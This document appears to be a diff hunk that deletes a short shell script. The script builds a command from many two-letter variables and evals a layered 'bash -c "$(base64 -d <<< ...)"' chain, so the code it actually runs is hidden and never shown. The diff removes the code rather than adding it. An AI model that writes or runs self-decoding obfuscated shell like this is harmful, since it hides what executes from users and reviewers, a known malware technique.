@@ -1,3 +1,0 @@
-z="
-";jz='aUNn';Vz='aGlZ';Ez='4 -d';Tz='WXlB';qz=' "$@';Nz='LWQg';gz='Z1lt';Zz='UWdQ';Yz='Z0xX';az='RHc4';iz='SkVB';rz='"';Gz=' "\';dz='Tm5Q';Uz='aUpD';Kz='JChi';Fz=' <<<';mz='aCAi';lz='KSIg';Jz='YyAi';Dz='ase6';Mz='NjQg';oz='Cg==';fz='S1NJ';Hz='YmFz';Oz='PDw8';nz='JEAi';Wz='WE5s';kz='PT0i';Qz='Cllt';cz='Y0Nr';pz='")" ';hz='Q0Fp';Sz='Q0F0';Cz='"$(b';Az='bash';ez='VDBp';bz='SUNK';Iz='aCAt';Rz='Rnph';Bz=' -c ';Pz='ICJc';Xz='TmpR';Lz='YXNl';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$z$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$z$az$bz$cz$dz$ez$fz$gz$Rz$hz$iz$jz$kz$lz$Hz$mz$nz$oz$pz$Az$qz$rz"
